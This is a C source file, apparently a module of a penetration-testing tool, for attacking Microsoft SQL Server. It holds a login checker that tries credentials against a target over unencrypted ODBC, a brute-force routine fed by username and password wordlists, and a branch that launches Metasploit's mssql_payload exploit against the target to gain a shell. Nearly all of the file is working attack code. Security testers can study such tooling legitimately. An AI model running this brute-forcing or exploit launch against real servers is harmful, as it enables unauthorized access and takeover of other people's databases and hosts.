
#include <sql.h>
#include <sqlext.h>
#include "../auditing-cybersecurity.h"
#include "../others/networking.h"
#include "activities.h"

int mssql_check_user(char *username, char *password){
	SQLHENV henv=SQL_NULL_HENV;
	SQLHDBC hdbc=SQL_NULL_HDBC;
	SQLHSTMT hstmt=SQL_NULL_HSTMT;
	if(SQLAllocHandle(SQL_HANDLE_ENV, SQL_NULL_HANDLE, &henv)<0) return show_message("Error during SQLAllocHandle()",0, 0, ERROR_MESSAGE, true);
	if(SQLSetEnvAttr(henv, SQL_ATTR_ODBC_VERSION, (SQLPOINTER*)SQL_OV_ODBC3, 0)<0) return show_message("Error during SQLSetEnvAttr()",0, 0, ERROR_MESSAGE, true);
	if(SQLAllocHandle(SQL_HANDLE_DBC, henv, &hdbc)<0) return show_message("Error during SQLAllocHandle()",0, 0, ERROR_MESSAGE, true);
	SQLSetConnectAttr(hdbc, SQL_LOGIN_TIMEOUT, (SQLPOINTER)5, 0);
	unsigned char odbcDriver[BUFFER_SIZE_1K]="";
	SQLRETURN retcode=0;
	SQLCHAR outstr[1024]="";
	SQLSMALLINT outstrlen=0;
	snprintf((char *) odbcDriver, sizeof(odbcDriver), "Driver={ODBC Driver 18 for SQL Server};Server=%s,%d;Encrypt=no;UID=%s;PWD=%s",
			target.strTargetIp, portUnderHacking,username,password);
	retcode = SQLDriverConnect(hdbc, NULL, odbcDriver,SQL_NTS, outstr, sizeof(outstr), &outstrlen, SQL_DRIVER_NOPROMPT);
	retcode = SQLAllocHandle(SQL_HANDLE_STMT, hdbc, &hstmt);
	if (hstmt != SQL_NULL_HSTMT) SQLFreeHandle(SQL_HANDLE_STMT, hstmt);
	if (hdbc != SQL_NULL_HDBC) {
		SQLDisconnect(hdbc);
		SQLFreeHandle(SQL_HANDLE_DBC, hdbc);
	}
	if (henv != SQL_NULL_HENV) SQLFreeHandle(SQL_HANDLE_ENV, henv);
	if(retcode==0) return true;
	return false;
}

int mssql(int type){
	switch(type){
	case MSSQL_BFA:
	bfa_init(10, "usernames_mssql.txt", "passwords_mssql.txt", MSSQL_BFA);
	break;
	case MSSQL_SHELL:
		char cmd[BUFFER_SIZE_1K]="";
		snprintf(cmd,sizeof(cmd),"msfconsole -q -x 'use exploit/windows/mssql/mssql_payload; set RHOSTS %s; set RPORT %d; run; exit'", target.strTargetIp,portUnderHacking);
		system_call(cmd);
		break;
	default:
		break;
	}
	PRINT_RESET;
	return RETURN_OK;
}
